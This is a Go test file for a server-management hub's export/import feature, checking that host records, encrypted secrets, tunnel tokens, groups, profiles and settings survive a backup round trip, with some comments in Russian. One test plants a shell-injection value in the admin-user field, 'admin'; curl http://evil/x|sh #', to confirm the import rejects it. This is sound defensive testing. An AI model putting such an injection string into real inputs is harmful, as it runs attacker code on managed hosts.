package store

import (
	"context"
	"path/filepath"
	"testing"
)

// TestExportImportHostsRoundTrip covers the backup/restore path end to end
// on real SQLite databases: export everything CreateHost/SetHostAdmin/
// SetHostSudoStatus/SetHostTerminalEnabled can set on a host, import that
// export into a second, empty database, and confirm every field — most
// importantly the encrypted blobs, which this whole feature exists to
// carry through unexamined — survived intact.
func TestExportImportHostsRoundTrip(t *testing.T) {
	ctx := context.Background()
	src, err := Open(filepath.Join(t.TempDir(), "src.db"))
	if err != nil {
		t.Fatalf("Open src: %v", err)
	}
	defer src.Close()

	id, err := src.CreateHost(ctx, "h1", "10.0.0.1", 22, "root", HostAuthKey, []byte("cipher-secret"))
	if err != nil {
		t.Fatalf("CreateHost: %v", err)
	}
	if err := src.SetHostAdmin(ctx, id, "admin", []byte("cipher-admin-pw")); err != nil {
		t.Fatalf("SetHostAdmin: %v", err)
	}
	if err := src.SetHostSudoStatus(ctx, id, SudoStatusNopasswd); err != nil {
		t.Fatalf("SetHostSudoStatus: %v", err)
	}
	if err := src.SetHostTerminalEnabled(ctx, id, true); err != nil {
		t.Fatalf("SetHostTerminalEnabled: %v", err)
	}
	if err := src.SetHostTunnelEnabled(ctx, id, true); err != nil {
		t.Fatalf("SetHostTunnelEnabled: %v", err)
	}
	if err := src.SetHostTunnelToken(ctx, id, []byte("cipher-tunnel-token")); err != nil {
		t.Fatalf("SetHostTunnelToken: %v", err)
	}
	if err := src.SetHostArch(ctx, id, "linux/amd64"); err != nil {
		t.Fatalf("SetHostArch: %v", err)
	}
	if err := src.SetHostVersion(ctx, id, "1.5.7"); err != nil {
		t.Fatalf("SetHostVersion: %v", err)
	}

	export, err := src.ExportHosts(ctx)
	if err != nil {
		t.Fatalf("ExportHosts: %v", err)
	}
	if export.Version != ExportFormatVersion {
		t.Errorf("export.Version = %d, want %d", export.Version, ExportFormatVersion)
	}
	if len(export.Hosts) != 1 {
		t.Fatalf("export.Hosts = %+v, want exactly one host", export.Hosts)
	}

	dst, err := Open(filepath.Join(t.TempDir(), "dst.db"))
	if err != nil {
		t.Fatalf("Open dst: %v", err)
	}
	defer dst.Close()

	imported, errs := dst.ImportHosts(ctx, export)
	if len(errs) != 0 {
		t.Fatalf("ImportHosts errs = %v, want none", errs)
	}
	if imported != 1 {
		t.Fatalf("imported = %d, want 1", imported)
	}

	got, err := dst.ListHosts(ctx)
	if err != nil {
		t.Fatalf("ListHosts: %v", err)
	}
	if len(got) != 1 {
		t.Fatalf("ListHosts = %+v, want one host", got)
	}
	h := got[0]
	if h.Name != "h1" || h.Addr != "10.0.0.1" || h.SSHUser != "root" || h.SSHAuthKind != HostAuthKey {
		t.Errorf("basic fields did not survive the round trip: %+v", h)
	}
	if string(h.SecretEnc) != "cipher-secret" {
		t.Errorf("SecretEnc = %q, want %q (ciphertext must round-trip byte for byte)", h.SecretEnc, "cipher-secret")
	}
	if string(h.AdminPasswordEnc) != "cipher-admin-pw" {
		t.Errorf("AdminPasswordEnc = %q, want %q", h.AdminPasswordEnc, "cipher-admin-pw")
	}
	if h.AdminUser != "admin" {
		t.Errorf("AdminUser = %q, want %q", h.AdminUser, "admin")
	}
	if h.SudoStatus != SudoStatusNopasswd {
		t.Errorf("SudoStatus = %q, want %q", h.SudoStatus, SudoStatusNopasswd)
	}
	if !h.TerminalEnabled {
		t.Error("TerminalEnabled = false, want true")
	}
	// The reverse-tunnel fallback is the one thing most worth carrying over
	// intact: a hub migrating to a new address/location — exactly what
	// export/import is for — is the single most likely time for SSH itself
	// to stop reaching a host (a firewall/security group allowlisting only
	// the old hub's IP), which is precisely the case this fallback exists
	// for. Dropping it silently here would leave a migrated host stuck with
	// no fallback exactly when it's needed most.
	if !h.TunnelEnabled {
		t.Error("TunnelEnabled = false, want true")
	}
	if string(h.TunnelTokenEnc) != "cipher-tunnel-token" {
		t.Errorf("TunnelTokenEnc = %q, want %q (ciphertext must round-trip byte for byte)", h.TunnelTokenEnc, "cipher-tunnel-token")
	}
	// TunnelCertSHA256 deliberately does NOT travel — see HostExport's own
	// doc comment: the new hub must pin its own trust-on-first-use
	// fingerprint on its first connection, not inherit one from whichever
	// hub exported this.
	if h.TunnelCertSHA256 != nil {
		t.Errorf("TunnelCertSHA256 = %x, want nil (must re-pin fresh on the new hub, not inherit the old one)", h.TunnelCertSHA256)
	}
	if h.Arch != "linux/amd64" || h.NktVersion != "1.5.7" {
		t.Errorf("Arch/NktVersion did not survive: %+v", h)
	}
}

// TestImportHostsPartialFailureKeepsGoing confirms one malformed entry
// (an invalid ssh_auth_kind here — the CHECK constraint schema.go already
// enforces) doesn't abort an otherwise-valid import: this is meant to
// tolerate a hand-edited or partially-corrupted export file.
func TestImportHostsPartialFailureKeepsGoing(t *testing.T) {
	ctx := context.Background()
	db, err := Open(filepath.Join(t.TempDir(), "hub.db"))
	if err != nil {
		t.Fatalf("Open: %v", err)
	}
	defer db.Close()

	export := HubExport{
		Version: ExportFormatVersion,
		Hosts: []HostExport{
			{Name: "good", Addr: "10.0.0.1", SSHUser: "root", SSHAuthKind: HostAuthPassword, SecretEnc: []byte("s"), Status: HostStatusNew, CreatedAt: Now()},
			{Name: "bad", Addr: "10.0.0.2", SSHUser: "root", SSHAuthKind: "not-a-real-kind", SecretEnc: []byte("s"), CreatedAt: Now()},
		},
	}

	imported, errs := db.ImportHosts(ctx, export)
	if imported != 1 {
		t.Errorf("imported = %d, want 1 (the good entry)", imported)
	}
	if len(errs) != 1 {
		t.Fatalf("errs = %v, want exactly one error for the bad entry", errs)
	}

	got, err := db.ListHosts(ctx)
	if err != nil {
		t.Fatalf("ListHosts: %v", err)
	}
	if len(got) != 1 || got[0].Name != "good" {
		t.Errorf("ListHosts = %+v, want only the good host", got)
	}
}

// TestImportHostsRejectsUnsafeAdminUser guards the import boundary itself:
// AdminUser round-trips through export/import with no encryption or other
// protection, so a hand-edited or tampered export file is untrusted input.
// Later, whatever ends up in this column gets interpolated into a remote
// shell command and a systemd EnvironmentFile line with no escaping
// (internal/hub's resolveAdminCredential/resetRemoteAdminPassword/
// renderEnv) — rejecting anything that isn't a plain identifier right here
// means a bad row never even reaches that far.
func TestImportHostsRejectsUnsafeAdminUser(t *testing.T) {
	ctx := context.Background()
	db, err := Open(filepath.Join(t.TempDir(), "hub.db"))
	if err != nil {
		t.Fatalf("Open: %v", err)
	}
	defer db.Close()

	export := HubExport{
		Version: ExportFormatVersion,
		Hosts: []HostExport{
			{
				Name: "poisoned", Addr: "10.0.0.1", SSHUser: "root", SSHAuthKind: HostAuthPassword,
				SecretEnc: []byte("s"), Status: HostStatusNew, CreatedAt: Now(),
				AdminUser: "admin'; curl http://evil/x|sh #",
			},
		},
	}

	imported, errs := db.ImportHosts(ctx, export)
	if imported != 0 {
		t.Errorf("imported = %d, want 0 — a shell-metacharacter AdminUser must be rejected", imported)
	}
	if len(errs) != 1 {
		t.Fatalf("errs = %v, want exactly one rejection", errs)
	}

	got, err := db.ListHosts(ctx)
	if err != nil {
		t.Fatalf("ListHosts: %v", err)
	}
	if len(got) != 0 {
		t.Errorf("ListHosts = %+v, want no hosts imported", got)
	}
}

func TestDecodeHubExportRejectsWrongVersion(t *testing.T) {
	_, err := DecodeHubExport([]byte(`{"version": 999, "hosts": []}`))
	if err == nil {
		t.Fatal("expected an error for an unsupported export version")
	}
}

func TestDecodeHubExportRejectsGarbage(t *testing.T) {
	_, err := DecodeHubExport([]byte(`not json at all`))
	if err == nil {
		t.Fatal("expected an error for a non-JSON file")
	}
}

// Формат 2: группы, родитель машины, профили с историей, шаблоны и
// настройки хаба едут в файл и восстанавливаются в пустом хабе; занятые
// имена профилей и шаблонов не затираются; файл версии 1 читается.
func TestExportImportV2RoundTrip(t *testing.T) {
	ctx := context.Background()
	src, err := Open(filepath.Join(t.TempDir(), "src.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer src.Close()
	parent, _ := src.CreateHost(ctx, "parent", "10.0.0.1", 22, "root", HostAuthKey, []byte("s1"))
	vm, _ := src.CreateHost(ctx, "vm1", "192.168.100.5", 22, "deploy", HostAuthKey, []byte("s2"))
	if err := src.CreateHostGroup(ctx, "prod"); err != nil {
		t.Fatal(err)
	}
	if err := src.CreateHostGroup(ctx, "empty-group"); err != nil {
		t.Fatal(err)
	}
	if err := src.SetHostGroup(ctx, parent, "prod"); err != nil {
		t.Fatal(err)
	}
	if err := src.SetHostParent(ctx, vm, parent); err != nil {
		t.Fatal(err)
	}
	pid, err := src.CreateProfile(ctx, Profile{Name: "web", Content: "version: 1\nname: web", Note: "n", Author: "admin"})
	if err != nil {
		t.Fatal(err)
	}
	if err := src.UpdateProfile(ctx, Profile{ID: pid, Name: "web", Content: "version: 1\nname: web\npackages: [nginx]", Note: "add nginx", Author: "admin"}); err != nil {
		t.Fatal(err)
	}
	if _, err := src.SaveVMTemplate(ctx, VMTemplate{Name: "small", Spec: `{"vcpus":1}`, Author: "admin"}); err != nil {
		t.Fatal(err)
	}
	if err := src.KVSet(ctx, "hub.events.settings", `{"record":["unreachable"]}`); err != nil {
		t.Fatal(err)
	}
	if err := src.KVSet(ctx, "hub.events.seen", "do-not-export"); err != nil {
		t.Fatal(err)
	}

	export, err := src.ExportHosts(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if export.Version != 2 || len(export.Groups) != 2 || len(export.Profiles) != 1 || len(export.VMTemplates) != 1 {
		t.Fatalf("export = %+v", export)
	}
	if export.Profiles[0].Versions == nil || len(export.Profiles[0].Versions) != 2 || export.Profiles[0].Versions[0].Content != "version: 1\nname: web" {
		t.Errorf("история профиля: %+v", export.Profiles[0].Versions)
	}
	if _, ok := export.Settings["hub.events.seen"]; ok {
		t.Error("в экспорт попал ключ, которого там быть не должно")
	}
	var vmExport HostExport
	for _, h := range export.Hosts {
		if h.Name == "vm1" {
			vmExport = h
		}
	}
	if vmExport.Parent != "parent" || vmExport.Group != "prod" {
		t.Errorf("машина в файле: %+v", vmExport)
	}

	dst, err := Open(filepath.Join(t.TempDir(), "dst.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer dst.Close()
	if _, err := dst.SaveVMTemplate(ctx, VMTemplate{Name: "small", Spec: `{"vcpus":8}`}); err != nil {
		t.Fatal(err)
	}
	imported, errs := dst.ImportHosts(ctx, export)
	if imported != 2 {
		t.Errorf("imported = %d, errs = %v", imported, errs)
	}
	if len(errs) != 1 {
		t.Errorf("ожидалось одно сообщение о занятом шаблоне, получено %v", errs)
	}
	hosts, _ := dst.ListHosts(ctx)
	byName := map[string]Host{}
	for _, h := range hosts {
		byName[h.Name] = h
	}
	if byName["vm1"].ParentID != byName["parent"].ID || byName["vm1"].Group != "prod" || byName["parent"].Group != "prod" {
		t.Errorf("связи после импорта: %+v", byName)
	}
	groups, _ := dst.ListHostGroups(ctx)
	if len(groups) != 2 {
		t.Errorf("группы: %v", groups)
	}
	profiles, _ := dst.ListProfiles(ctx)
	if len(profiles) != 1 || profiles[0].Name != "web" {
		t.Fatalf("профили: %+v", profiles)
	}
	versions, _ := dst.ProfileVersions(ctx, profiles[0].ID, 10)
	if len(versions) != 2 {
		t.Errorf("история профиля после импорта: %+v", versions)
	}
	tpl, _ := dst.ListVMTemplates(ctx)
	if len(tpl) != 1 || tpl[0].Spec != `{"vcpus":8}` {
		t.Errorf("существующий шаблон затёрт: %+v", tpl)
	}
	if v, ok, _ := dst.KVGet(ctx, "hub.events.settings"); !ok || v != `{"record":["unreachable"]}` {
		t.Errorf("настройки не перенесены: %q", v)
	}

	if _, err := DecodeHubExport([]byte(`{"version": 1, "hosts": []}`)); err != nil {
		t.Errorf("файл версии 1 отвергнут: %v", err)
	}
	if _, err := DecodeHubExport([]byte(`{"version": 3, "hosts": []}`)); err == nil {
		t.Error("файл из будущего принят")
	}
}
